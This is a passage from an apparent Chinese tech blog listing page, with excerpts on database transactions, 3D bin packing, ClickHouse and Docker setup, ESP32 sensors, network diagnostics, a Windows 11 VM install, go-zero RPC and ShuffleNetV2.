了解多路复用技术的分类和适用场合
掌握网络系统的分层体系结构和OSI
掌握网络系统的分层体系结构和OSI
七层参考模型
七层参考模型
了解ARPA 的TCP/IP四层模型
了解ARPA 的TCP/IP四层模型
电子发烧友
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5cf1118114cd129e1d280102bbd111db/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32e34d970d710cdfe0ddf4d320e157c7/" rel="bookmark">
			女程序员职业规划，请把这些学完再去面试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		二、常见的并发问题 1、脏读 一个事务读取了另一个事务未提交的数据
2、不可重复读 一个事务对同一数据的读取结果前后不一致。两次读取中间被其他事务修改了
3、幻读 幻读是指事务读取某个范围的数据时，因为其他事务的操作导致前后两次读取的结果不一致。幻读和不可重复读的区别在于,不可重复读是针对确定的某一行数据而言,而幻读是针对不确定的多行数据。因而幻读通常出现在带有查询条件的范围查询中
三、事务隔离级别 1、读未提交(READ UNCOMMITTED) 可能产生脏读、不可重复读、幻读
2、读已提交(READ COMMITTED) 避免了脏读，可能产生不可重复读、幻读
3、可重复读(REPEATABLE READ)（mysql默认隔离级别） 避免了脏读，不可重复读。通过区间锁技术避免了幻读
4、串行化(SERIALIZABLE) 串行化可以避免所有可能出现的并发异常,但是会极大的降低系统的并发处理能力
四、数据库日志有哪些？ 1、undo日志 undo日志用于存放数据修改被修改前的值
UNDO LOG中分为两种类型，一种是 INSERT_UNDO（INSERT操作），记录插入的唯一键值；
一种是 UPDATE_UNDO（包含UPDATE及DELETE操作），记录修改的唯一键值以及old column记录。
2、redo日志 mysql会将一个事务中的所有sq先l记录到redo log中，然后再将记录从redo log同步到数据文件中
它可以带来这些好处：
当buffer pool中的dirty page 还没有刷新到磁盘的时候，发生crash，启动服务后，可通过redo log 找到需要重新刷新到磁盘文件的记录；buffer pool中的数据直接flush到disk file，是一个随机IO，效率较差，而把buffer pool中的数据记录到redo log，是一个顺序IO，可以提高事务提交的速度； 3、binlog日志 用于数据库主从复制的记录，是二进制格式。在事务提交之后进行一个磁盘写入。
这里注意下redo log 跟binary log 的区别，redo log 是存储引擎层产生的，而binary log是数据库层产生的。假设一个大事务，对tba做10万行的记录插入，在这个过程中，一直不断的往redo log顺序记录，而binary log不会记录，直到这个事务提交，才会一次写入到binary log文件中
五、数据库事务控制 1、默认情况下，开启事务自动提交功能。每执行一个sql，都会对应一个事务的提交
2、spring会将底层连接的自动提交特性设置为false。使用手动提交
六、事务的ACID特性 1、原子性(Atomicity) 事务中的所有操作作为一个整体像原子一样不可分割，要么全部成功,要么全部失败。
2、一致性(Consistency) 事务的执行结果必须使数据库从一个一致性状态到另一个一致性状态。一致性状态是指:1.系统的状态满足数据的完整性约束(主码,参照完整性,check约束等) 2.系统的状态反应数据库本应描述的现实世界的真实状态,比如转账前后两个账户的金额总和应该保持不变。
3、隔离性(Isolation) 并发执行的事务不会相互影响,其对数据库的影响和它们串行执行时一样。比如多个用户同时往一个账户转账,最后账户的结果应该和他们按先后次序转账的结果一样。
4、持久性(Durability) 事务一旦提交,其对数据库的更新就是持久的。任何事务或系统故障都不会导致数据丢失。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/32e34d970d710cdfe0ddf4d320e157c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/944b98ddef9135b1dce687764181937f/" rel="bookmark">
			京东物流-三维装箱（记录）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言背景方法问题分析 方法概述第一版本第二版本 第三章 实验结果装箱结果分析与验证 总结与展望.总结展望 代码题目 前言 就只过了个初赛，复赛必须要用Java写，就放弃了，这里记录一下写的东西。
队友:
思禾
OuJiang2021
背景 随着国民经济的快速发展，我国物流行业的业务需求量越来越多。如图1-1所示，根据国家统计局官方数据表明，2016-2021上半年全国社会物流总费用都呈现了增长的趋势，这即是国家国力提升，国民生活素质的不断提高的表现，同时也体现了中国的物流业发展的日益强大。今天的中国的物流业已经建立起世界领先的快递物流体系，与以往科技含量较低的行业状况相比，目前物流行业信息化程度增强，物流集成化和自动化水平有较大提升，但是在对物品进行装箱打包的问题有的企业还是在采用凭借人工方式进行装车配送，由于订单数量的庞大和时限要求，操作人员都是凭借以往经验进行装载，难以保证配送车辆的满载，同时人工装载劳动强度大，装载过程耗费时间长，货物被反复取出装载的现象较为普遍，容易造成货物的破损，进一步增加企业成本。因此在包裹的打包环节,选取合适的包装耗材非常重要。在庞大的包裹基数下,单个包裹耗材成本的略微降低,能带来极大的经济效益和社会效益。
装箱问题可追溯到 1831 年高斯研究布局问题，属于复杂组合优化问题，是 NPC 问题。在 1980 年前，多数研究针对一维、二维装箱问题，1980年后，随着低维装箱问题研究成果积累和计算机技术发展，三维装箱问题逐渐成为学术界热门方向。三维装箱问题在物资装载、物流等行业都有应用。
研究三维装箱问题，能够提高车辆运输的效率，减少车辆的浪费，降低物流的成本，如果在此基础上实现自动化装箱将大大减少企业物流的成本，提升企业的盈利能力，同时其能够减少物流垃圾的产生，减少污染物的排放，因此对三维装箱问题的研究具有十分重要的经济价值。
方法 问题分析 问题一：
根据题目我们需要在提供的订单数据中选择合适的耗材去做出合适的装配方案，并且目标是要用的耗材数量越少，并且耗材的大小越小越好。
这里就牵涉到二个必须考虑的问题：
1、 选择多大的箱子来装物品
2、 物品应该如何放入箱子
问题二：
问题二需要自己给出10种优化的耗材尺寸，要解决这个问题，我们就必须要根据所有订单，给出合适的耗材尺寸，让在物品装箱的时候能够有更大的空间利用率；针对此题，我们考虑了两种方法：
第一个方法就是将在第一题装完一个箱子后，将最终整个箱子的实物品空间坐标得到，然后在得到所有1000个订单的数据后，将1000组数据的体积给求出，由小到大排列，然后分为10组，每组100个数据，在每组中将长宽高分别想加求平均，得到10组长宽高，这样得出10个箱子的优化尺寸；
方法概述 第一版本 为了快速将题给过一遍，我们先没有考虑到袋子的使用，因为袋子的可变换性很强，一开始考虑到袋子的使用会让整个程序显得复杂，会拖慢整个做题的进度，因此我们首先考虑的是直接用箱子，并且在选择箱子的时候，我们暂时选择的是最大的箱子。那么选箱子的问题我们就暂时不考虑，就专注于如何将物品放入箱子，对于这个问题，我们是暂时不考虑物品的旋转问题，按照常规的堆叠操作现将整个流程过一遍，这里采用的是将物品按照y-&gt;x-&gt;z的顺序，依次放入物品。先朝着y轴放置物品，当y轴上物品y坐标大于箱子的y坐标的时候，那么物品向x轴进行拓展，然后物品再次向y轴拓展，一直到当x轴上物品x坐标大于箱子的x坐标的时候,这个时候又向z轴进行拓展，直至将一个订单中的物品全部装入箱子即可。
第二版本 在能够正常进行工作后，我们在第一版baseline的基础上，加了装箱策略。在进行装配之前，我们首先将所有的箱子的体积算出，然后将箱子的体积由小到大进行排序。然后在拿到一个订单后，我们首先将所有物品的体积算出求和，然后在箱子集合中，拿到体积大于所有物品体积之和的箱子集合2，在箱子集合2中从小到大拿出箱子来装一个订单的所有物品，当拿出的箱子不能够装下的时候就在箱子集合2中拿出下一个箱子，直到能够装下所有物品。
第三章 实验结果 装箱结果分析与验证 下面图一是我们在进行装箱后的仿真结果图。
为了更加明确的表明我们的装箱顺序，这里我只拿取了订单0中的数据进行分析，因为后面的装箱步骤和前面没有任何变化，因此，取一个订单进行阐述可能会得到更好的描述结果。
由上图可以看到，我们主要采用的装箱方式为先向y轴进行拓展，直到y轴已经不能拓展位置，这时我们在进行z轴拓展,下图二显示了我们在x方向不够然后向z轴拓展的示意图。
由此，我们依次按照这种y-x-z在y-x-z的顺序向后继续进行，当当前选择的这一个箱子不够用即不能在继续装下任何一个商品时，我们就在拿一个箱子进行装然后按照这种同样的方法进行装，当然若一个箱子能装下所有的SKU那当然最好，下图3显示了一个箱子装满的情况。
上面图三显示了一个箱子将所有当前订单的所有SKU装完的情况，由图三，我们可以看到，该装箱效果还是比较理想，如果箱子选的合理，刚好他的高度方向不能拓展的话，那么该箱子的空间利用率总体来说还是挺大的，其唯一没有利用到的空间就是在进行y向x再向z拓展时，没有选择一个恰好能填补当前轴大小的SKU,但是对于这种空间浪费我们认为在一定条件下是允许的，因为在实际装箱中，我们也不能百分百的的将整个箱子空间利用率占用完，而是只能尽可能大的去利用这个箱子。还有一部分就是在上图3中的顶部，我们直观的这样看过去。感觉上面部分空闲了很大一部分空间，其实实际上并非如此，这里呈现这个原因的主要原因是应为使用的绘图工具为python的matplotlib库进行绘制的，这在绘制的时候，它为了使我们看的更直观，它软件上将z轴正对我们的这一部分给放大了，因此，给我门的感受就像是上部分空闲很大，但实际上，若选箱恰当，它上部分空闲空间只有在想x轴拓展时因为没有SKU而空闲的这一小部分，因此，从整体上来看，我们这样的装箱效果还是蛮理想的。
由上面的仿真结果来看，我们的采取的这种装箱效果满足实际的装箱需求，同时也满足大赛题目要求，并且通过绘图方式，我们可以直观清晰的看到我们的这种装箱方式，结果准确。
总结与展望. 总结 如上所述，本算法主要分为选箱策略、装箱策略、防重叠策略三个部分组成。大体上通过体积计算进行箱子选型，并通过采用体积优先且按照从零点开始放置SKU的方式进行放置，在放置过程中，采用X-Y-Z轴的放置方式进行层次放置策略，且为了保证最大化利用放置空间，预设将相同SKU放置在一起，同时，采用饱和最大一轴的策略来避免SKU放置重叠，即若当前轴放置有多种SKU，那么在迭代到下一轴的放置时，选择当前SKU叠放中最大的下一轴坐标为初始坐标。
本算法生成的装箱结果，获得有效成绩，且由上面的仿真结果来看，我们的采取的这种装箱效果能够满足实际的装箱需求，同时也满足大赛题目要求。
展望 通过本算法虽然能够获得一个较有策略的装箱结果，但从算法步骤和优化策略上看还有较大发展空间：
首先在箱子选型中，本算法只考虑了当前单中SKU集体体积这一维度，但是由于体积由SKU长宽高的三个维度共同作用，所以在考虑上还不够全面，后期将会考虑引入一个多方维度（如箱子是否接近SKU长宽高比例等）的衡量函数来对不同箱子对当前单的一个评分再进行选择。在装箱算法上，我们目前按体积最大优先这种贪心策略作为装箱的主要策略，但是缺少了对SKU数量的一个评价，后期可能会尝试引入多个装箱策略，甚至考虑诸如遗传算法，模拟退火算法等组合优化算法来进行放置，甚至会考虑多次回溯的方式来进行对空间的最大利用。在细节处理上，在一轴向另一轴扩展的时候，本算法直接采用饱和最高的坐标点的方式，相对来说有一段空间浪费较大，后期在此处还应该结合SKU三维旋转和重叠面判断的方式进行优化，应该尽量充分利用细隙。在箱体设计上也是本算法后期的一大优化点，在全局上对所有订单的SKU按照前面的优化思路进行装箱之后对于每一个订单应该会有一个较为合适的装箱结果，对所有订单在所用体积以及箱子的长宽高进行数据统计，再尝试以某种策略进行箱体设计。
总之，本算法还有很大的发展空间，对于装箱此类的NP-hard问题，我们只有不断地迭代才能收敛到全局最优，希望后期继续发展，交出更满意地答卷。 代码 #%% from concurrent.futures import ThreadPoolExecutor from concurrent.futures import ProcessPoolExecutor from os import stat, terminal_size from numpy import string_, zeros import pandas as pd import copy duiwu = '老欧这把能行吧' xiangzi = '普通京东2号20版平台纸箱' wenti = '1' #%% dingdan = '.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/944b98ddef9135b1dce687764181937f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef75ebd64839ca24de2d6201f39eea59/" rel="bookmark">
			Docker创建ClickHouse 并初始化数据测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、Docker安装ClickHouse docker run -d --name some-clickhouse-server \ -p 8123:8123 -p 9009:9009 -p 9091:9000 \ --ulimit nofile=262144:262144 \ -v /home/clickhouse:/var/lib/clickhouse \ yandex/clickhouse-server 2、下载SSBM工具 1、git clone https://github.com/vadimtk/ssb-dbgen.git 2、cd ssb-dbgen 3、make 3、生成数据 ./dbgen -s 100 -T c ./dbgen -s 100 -T p ./dbgen -s 100 -T s ./dbgen -s 100 -T l ./dbgen -s 100 -T d 查看下数据
4、建表 CREATE TABLE default.customer ( C_CUSTKEY UInt32, C_NAME String, C_ADDRESS String, C_CITY LowCardinality(String), C_NATION LowCardinality(String), C_REGION LowCardinality(String), C_PHONE String, C_MKTSEGMENT LowCardinality(String) ) ENGINE = MergeTree ORDER BY (C_CUSTKEY); CREATE TABLE default.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ef75ebd64839ca24de2d6201f39eea59/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0cd5a1bf6b78049c93fde4352bb906e/" rel="bookmark">
			ESP32超声波测距
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 实验目的 学习HC-SR04模块的使用 实现使用模块测距并显示 2. 实验设备 ESP32-board，HC-SR04模块，SSD1306 OLED显示屏模块 相关知识点
HC-SR04模块是一款利用超声波测量距离的传感器，模块的实物图如图所示
因为声波在空气中的传播速度是固定的，发射的超声波遇到障碍物会反射回来，我们记录下发射波到接受反射波之间的时间差，就可以计算出模块距离障碍物的距离。我们可以把这个用于测距、避障等领域。HC-SR04模块的测量距离为2-400cm，测量角度为30°，当测量距离大于范围时传感器接收不到反射波应该不难理解，需要注意的是当测量距离小于一定距离时，因为发射器发出发射波后还会有一定时间的余振，也被叫作拖尾，这段时间内接收器不能区分余振接收器和反射波，所以这段时间内反射回来的。和模块有四个引脚，分别是电源、地、TRIG和ECHO，TRIG引脚输入触发信号，ECHO引脚根据接收到返回信号的时长输出高电平，可以触发中断。
模块的使用步骤如下：TRIG引脚输入至少10us的高电平，触发测距操作模块自动发送8个40kHz的方波脉冲，ECHO引脚变高电平，开始计时检测到返回信号，ECHO引脚变低电平，停止计时使用计时时长计算出距离
我们可以看到工作时的时序图如下：
了解了原理之后，不必要自己手动编写驱动程序，我们提供了驱动文件，了解原理是为了能够针对不同情况做出自定义的修改，驱动文件的使用方法如下：
方法 说明
HCSR04. HCSR04(tri, ech) 构造方法，根据传入的引脚好创建对应的HCSR04对象，tri为TRIG引脚名，ech为ECHO引脚名
HCSR04.distance() 返回距离，单位为cm 3.实验内容 上载驱动文件，创建HCSR04对象，使用定时器循环测量距离并显示在显示屏上。
以下是实现代码：
from machine import I2C, Timer, Pin from ssd1306 import SSD1306_I2C from HCSR04 import HCSR04 i2c = I2C(sda=Pin(23), scl=Pin(19)) #连接SSD1306引脚 oled = SSD1306_I2C(128, 64, i2c, addr=0x3c) hc = HCSR04(tri=14, ech=12) def HC_Run(t): oled.fill(0) oled.text("HCSR04", 0, 0) # 读取距离并显示 oled.text('{:.1f} cm'.format(hc.distance()), 0, 32) oled.show() timer = Timer(-1) timer.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0cd5a1bf6b78049c93fde4352bb906e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea92c75950c87d7fb6ce95bf77c2e3c9/" rel="bookmark">
			计算机网络ping本机ip,使用ping命令检查本机的TCP / IP协议
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TCP / IPTCP / IP实验课程的基本内容实验课程的基本内容[教学目的]为了能够掌握基本的TCP / IP工具网络命令查看本机当前的tcp/ip网络连接情况，请使用TCP / IP工具了解网络连接状态，并进一步诊断网络故障. [实验环境]由两个或多个Windows9X和Windows 2000 Professional服务器组成的局域网. 实验课的基本内容实验课的基本内容[实验内容] 1. 使用Ping命令检查网络连接. 2.使用Ipconfig查看网络配置. 3.使用Tracert命令跟踪路由. 4.使用Nbtstat查看和显示基于TCP / IP(NetBT)协议，NetBIOS名称表以及本地和远程计算机的NetBIOS名称缓存的NetBIOS统计信息. 5.使用Telnet进行远程管理. 6.使用Arp显示和修改“地址解析协议(ARP)”缓存中的条目. 7.使用主机名查看主机名[使用Ping命令检查网络连接] Ping命令是用于查找以下内容的基本命令故障原因并用于确认是否可以通过IP网络与通信对象交换信息. 使用Ipconfig命令，用户可以轻松了解IP地址的实际配置，例如IP地址，网关网络命令查看本机当前的tcp/ip网络连接情况，子网掩码和网卡的物理地址.
因此，很好地使用这两个命令对于理解故障情况非常重要. ping命令的使用Ping命令是Windows 95之后系统中集成的专用于TCP / IP协议的检测工具. 它是在DOS模式下测试网络性能的程序，用于分析它是否可以通过IP网络与特定计算机进行通信. 将消息发送到IP地址指定的对象，然后等待对方的响应. 如果可以正常收到响应，则表示对方的计算机和中线正常. 如果没有收到响应，或者接收响应所需的时间太长，则可以得出结论，网络上的某个地方存在问题. Ping的最常见用途是在安装网络或调试网络故障时检查网络是否已连接. 它还可以用于检查连接到站点的网络的速度. 在“命令提示符”窗口的命令行中输入带有参数的Ping命令，以显示Ping命令的响应信息. 任何使用TCP / IP协议的局域网或广域网，当客户端和客户端无法正常访问或网络工作不稳定时，请始终尝试使用Ping命令确认并消除问题. [实验过程] [使用Ping命令检查网络连接] 1. Ping命令的语法格式Ping目标地址(或IP地址)[参数]其中，目标地址是指被测计算机的IP地址或域名. 常用的主要参数有: -a: 解析主机地址.
-n: 数据，发送的测试包数，默认值为4. -L: 值，发送的缓冲区大小. -T: 继续执行Ping命令，直到用户按下[Ctrl + C]键终止. 通过运行“ Ping”或“ Ping-？”可以查看与Ping命令相关的其他参数. 在MS-DOS提示符下命令. [实验过程] [使用Ping命令检查网络连接] 2.使用Ping命令检查本地计算机是否已连接到具有指定IP地址的计算机. 当使用Ping工具检查网络服务器和任何客户端上TCP / IP协议的操作时，只要计算机在网络IP地址中的任何其他计算机上ping通即可. 例如，要测试l92.168.0.1计算机上的TCP / IP协议是否正常运行，只需在“命令提示符”窗口的当前命令提示符行中键入“ ping l92.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea92c75950c87d7fb6ce95bf77c2e3c9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d7b0417c8f5ef4aa3d28007c5ffed5c/" rel="bookmark">
			说说Dokcer是怎么一回事吧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		docker常用帮助类文档：
https://docs.docker.com/engine/install/centos/
docker的安装：
1.
sudo yum install -y yum-utils
sudo yum-config-manager –add-repo https://download.docker.com/linux/centos/docker-ce.repo
sudo yum install docker-ce docker-ce-cli containerd.io
sudo systemctl start docker
sudo docker run hello-world
注意容器是要通过镜像来创建的
docker images 查看镜像
docker ps 查看存活的容器
docker ps -a 查看所有的容器
docker rm 容器id 删除容器
docker rmi 镜像 删除镜像
Linux中的命令是通过/bin/bash或者/bin/sh来进行解释的
拉取镜像
docker pull centos
docker run centos
如果容器没事干，docker引擎就会把它干掉。
docker stop 容器id
docker kill 容器id
docker exec -i -t 容器id /bin/bash
exit
ctrl+p +Q
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d7b0417c8f5ef4aa3d28007c5ffed5c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d210e7e4a42418408c4f0011810cf23/" rel="bookmark">
			【Windows11来了】立刻安装Windows11预览版抢先体验（虚拟机 | 含详细安装步骤）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、微软Windows 11系统二、Windows11预览版下载三、VirtualBox虚拟机的安装四、创建虚拟机五、在虚拟机中安装Windows 11操作系统1、载入系统镜像2、系统安装设置3、系统初始化设置4、安装完成 六、Windows 11体验1、开始菜单效果2、系统设置3、我的电脑4、命令指示符5、Edge浏览器6、应用商店7、据说可以直接运行apk 七、完毕 一、微软Windows 11系统 嗨，大家好，我是新发。
今天（2021-6-25）早上起床看手机的时候，我看到了一条新闻：【微软正式推出Windows 11系统】，哦？不是说好了Windows 10是最后一款独立发布的系统了吗？将信将疑的我打开了微软的官网：https://www.microsoft.com/zh-cn
醒目的Windows 11 焕新登场印入眼帘，看来传闻是真。
关于Windows 11的常见问题官方也做了解答，从这里可以看出，正式版的Windows 11还没放出来~
不过，Windows11预览版已经曝光出来了，嘛，立刻下载下来体验一下，本文我会详细介绍整个安装过程，各位想尝鲜的同学跟着我的步骤就可以啦~
另，我之前写过三篇虚拟机安装操作系统的文章，感兴趣的同学可以看看。
《手把手教，使用VirtualBox虚拟机安装Ubuntu系统》
《手把手教，使用VirtualBox虚拟机安装Windows XP系统》
《手把手教，使用VMware虚拟机安装Windows XP系统》
二、Windows11预览版下载 Windows11预览版我已转存到网盘，地址：https://cloud.189.cn/t/u2qaAz77RRb2
文件大小4.54GB，下载速度是2.3MB/s左右，下载大约需要33分钟。
三、VirtualBox虚拟机的安装 因为Windows11目前还是预览版，多多少少有点BUG，安全起见，安装到虚拟机里。
我用的虚拟机软件是VirtualBox，这里简单说下VirtualBox的安装~
VirtualBox官网：https://www.virtualbox.org/
选择windows版本，点击下载，
下载完毕，
运行安装，安装成功后打开VirtualBox，
四、创建虚拟机 点击新建，
输入名称，选择虚拟机存放的文件夹，类型选择Microsoft Windows，版本这里选Windows 10 (64-bit)，因为没有Windows 11可以选~
分配内存，默认2G，
创建虚拟硬盘，
虚拟硬盘类型选择VDI，
虚拟硬盘空间选择动态分配，
设置虚拟硬盘的存放位置和极限大小，
这样，我们的虚拟机就创建好了，
五、在虚拟机中安装Windows 11操作系统 1、载入系统镜像 点击启动按钮，
由于我们还没安装操作系统，此时会弹出提示框，点击取消按钮，
重启虚拟机，即可进入Windows 11系统安装程序。
2、系统安装设置 语言只有英语的，没有简体中文，直接Next，
点击Install now，
没有产品密钥，点击I don't have a product key，
系统选择Windows 11 Home，然后Next，
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0d210e7e4a42418408c4f0011810cf23/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a7f185f5e86c9e70f549cca3739e5ff/" rel="bookmark">
			各尺寸学术会议海报模板[转]
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在线下载Poster模板的网址：
https://www.posterpresentations.com/free-poster-templates.html
自己网上收集的模板：
链接：https://pan.baidu.com/s/1ylDr_G5_BolVRXheWyDPcg
提取码：hday
复制这段内容后打开百度网盘手机App，操作更方便哦
PS：校徽扣去背景，设置成白色的方法：
在线去底网址：https://www.aigei.com/bgremover （用谷歌、火狐浏览区打开，容差值可以选择大一些）
导出的图无法放到PS中，可以直接在PPT中导入，右击选择“设置图片格式”，在图片栏下选择“重新着色”，选择无色即可；
————————————————
本文转自CSDN博主「skye_fly」的原创文章，原文链接：https://blog.csdn.net/skye_fly/article/details/110233160
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35cafa52a80b0f488b0c1f7e9851c79f/" rel="bookmark">
			写接口--UML接口类的表现方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何定义接口类：
为防止子类内存泄漏，定义接口的时候，析构函数需要定义成virtual 析构函数。
在UML中，斜体代表抽象类和抽象函数（带有抽象函数的类叫抽象类，抽象函数就是纯虚函数）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8670accdb7401227a4386c24e8af024/" rel="bookmark">
			IDEA导入springboot工程后Cannot resolve plugin org.springframework.boot:spring-boot-maven-plugin:＜unknown＞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天在gitee上拉取springboot项目后，发现idea直接报错了。报错如下：
Cannot resolve plugin org.springframework.boot:spring-boot-maven-plugin:
最开始我还以为是项目出错，百度之后发现其实是该项目的配置中使用了默认的maven配置文件和默认的本地仓库地址。
解决方法：
打开File --&gt; Settings --&gt; Build, Execution, Deploymen --&gt; Build Tools --&gt; Maven，找到用户maven配置文件和本地仓库地址，修改为本地配置文件路径和仓库地址即可。
修改前：
修改后：
重新刷新maven，问题解决
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4b1a56289997a1158c2d5c4a27613d65/" rel="bookmark">
			go-zero 1—rpc服务的创建和rpc服务之间的调用，并介绍go-zero 服务启动的流程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前期准备 如果对 grpc 还不太了解的，可以看看我的这栏文章https://blog.csdn.net/wanmei002/category_11067794.html
因为 服务发现和服务注册用到了 etcd , 但是最新的 grpc 跟 etcd 不兼容，
所以 protoc-gen-go 跟 grpc 的版本要降级
go get -u github.com/golang/protobuf/protoc-gen-go@v1.3.2
go get google.golang.org/grpc@v1.29.1
先贴以下我的 go.mod
require ( github.com/golang/protobuf v1.4.2 github.com/modern-go/concurrent v0.0.0-20180306012644-bacd9c7ef1dd // indirect github.com/tal-tech/go-zero v1.1.4 google.golang.org/grpc v1.29.1 ) 简单初始化 一个 grpc server 以下代码来自 go-zero 文档, 地址: https://github.com/tal-tech/zero-doc/blob/main/doc/shorturl.md
建一个文件，进入 初始化: go mod init *****goctl rpc template -o transform.protogoctl rpc proto -src transform.proto -dir .go get github.com/golang/protobuf@v1.4.2go get google.golang.org/grpc@v1.29.1go get 获得所有的依赖查看下 etc/transform.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4b1a56289997a1158c2d5c4a27613d65/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/11a7eed0f7dbc2a592a8ae76930368a1/" rel="bookmark">
			win7计算机未连接网络连接,win7连接可用，未连接怎么办？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		操作系统：win7 64位旗舰版
电脑无线网络连接不上?下面就一起来了解一下。
1、打开桌面右下角的网络图标发现没有显示无线网络列表。
2、开始菜单打开控制面板。
3、选择控制面板右上角的查看方式为小图标。
4、到Windows移动中心，鼠标点击打开。
5、点击打开无线按钮，便成功启用了无线网络功能，您的无线网络列表就可以显示。
6、鼠标右击桌面计算机图标，出现的上下文菜单中选择管理。
7、打开计算机管理窗体后，依次定位到系统工具-设备管理器-网络适配器。
8、找到自己的无线网络驱动程序，右击此项，弹出的菜单列表中选择禁用。
9、此时无线网络驱动项的图标中出现了向下箭头，表示已禁用无线网络驱动。接着再次右击它，在右键菜单中选择启用即可。
10、若您没有安装或长时间未更新无线网络设备驱动，请打开驱动精灵等软件，安装或更新自己的无线网络驱动程序。
11、如果通过系统软件设置的方法没有解决此问题，那就有可能是硬件问题了，此时，您只有送修检查自己的无线网卡是否损坏。若出现如下能搜索到周围的无线网络，你便可以使用无线网络功能了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7177567b99a188ff5aa9f2df6e3812eb/" rel="bookmark">
			轻量级网络——ShuffleNetV2
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.ShuffleNetV2的介绍2.ShuffleNetV2的四条实用指南G1) Equal channel width minimizes memory access cost (MAC)G2) Excessive group convolution increases MACG3) Network fragmentation reduces degree of parallelismG4) Element-wise operations are non-negligible 3.ShuffleNetV2的结构Channel Split and ShuffleNet V2Analysis of Network Accuracy 4.ShuffleNetV2的性能统计5.ShuffleNetV2的pytorch实现 回顾： 轻量级网络——ShuffleNetV1 paper链接：ShuffleNet V2: Practical Guidelines for Efficient CNN Architecture Design
关键内容：
ShuffleNetV2中提出了一个关键点，之前的轻量级网络都是通过计算网络复杂度的一个间接度量，即FLOPs为指导。通过计算浮点运算量来描述轻量级网络的快慢。但是从来不直接考虑运行的速度。在移动设备中的运行速度不仅仅需要考虑FLOPs，还需要考虑其他的因素，比如内存访问成本(memory access cost)和平台特点(platform characterics)。
所以，ShuffleNetV2直接通过控制不同的环境来直接测试网络在设备上运行速度的快慢，而不是通过FLOPs来判断。
1.ShuffleNetV2的介绍 在之间轻量级网络的发展中，为了度量计算复杂度，一个广泛使用的度量标准是浮点运算的数量(FLOPs)。然而，FLOPs是一个间接的指标。这值是一个近似，但通常不等同于我们真正关心的直接指标，比如速度或延迟。
如上图，具有相似FLOPs的网络却具有不同的网速。因此，使用FLOPs作为计算复杂度的唯一指标是不够的，可能会导致次优化设计。
间接(FLOPs)和直接(速度)指标之间的差异可以归结为两个主要原因。首先，FLOPs没有考虑到几个对速度有相当大影响的重要因素。其中一个因素就是内存访问成本(MAC)。在某些操作(如组卷积)中，这种代价构成了运行时的很大一部分。它可能会成为具有强大计算能力的设备的瓶颈，例如gpu。在设计网络体系结构时，不应该简单地忽略这个代价。另一个是并行度。在相同的FLOPs下，具有高并行度的模型可能比另一个具有低并行度的模型快得多。
其次，由于平台的不同是，使用相同的FLOPs操作可能有不同的运行时间。我们不能肯定地认为3 × 3 conv比1 × 1 conv慢9倍。因为最新的CUDNN库专门针对3 × 3 conv进行了优化。
因为，ShuffleNetv2提出了设计应该考虑两个原则：
应该使用直接度量(如速度)而不是间接度量(如FLOPs。这些指标应该在目标平台上进行评估。（也就是实事求是） 然后，ShuffleNetv2根据这两个原则，提出了四种有效的网络设计原则：
G1: Equal channel width minimizes memory access cost (MAC)G2: Excessive group convolution increases MACG3: Network fragmentation reduces degree of parallelismG4: Element-wise operations are non-negligible 在计算复杂度为40M FLOPs的情况下，ShuffleNet v2的精度分别比ShuffleNet v1和MobileNet v2高3.
	</div>
	<div class="list__footer clearfix">
